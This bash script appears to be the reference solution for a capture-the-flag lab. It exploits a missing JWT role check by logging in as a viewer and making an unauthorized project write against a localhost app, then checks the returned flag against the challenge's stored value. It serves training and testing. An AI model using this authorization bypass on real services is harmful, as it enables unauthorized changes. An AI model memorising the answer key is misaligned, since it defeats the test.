#!/usr/bin/env bash
# ============================================================
# ProjectBoard (labs13) — reference solution: JWT role claim
# never checked
#
# Chain: login as the viewer (lowest-privilege token) -> prove
# the write bypass with a SAFE write (create one disposable
# project) -> flag in the response. The pre-seeded projects
# are never modified or deleted.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8093)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8093}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "[*] logging in as viewer" >&2
TOKEN="$(curl -fsS -X POST "$BASE/auth/login" -H 'Content-Type: application/json' \
  -d '{"username":"viewer","password":"viewer123"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin).get("token",""))')"
[[ -n "$TOKEN" ]] || { echo "[-] failed: login returned no token" >&2; exit 1; }

echo "[*] safe write proof: creating one disposable project" >&2
RESP="$(curl -fsS -X POST "$BASE/api/projects" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d "{\"name\":\"test-project-$(date +%s)-$RANDOM\",\"status\":\"test\"}")"

flag="$(python3 -c 'import sys,json; print(json.load(sys.stdin).get("flag",""))' <<<"$RESP")"
if [[ -z "$flag" ]]; then
  echo "[-] failed: no flag in response: $RESP" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
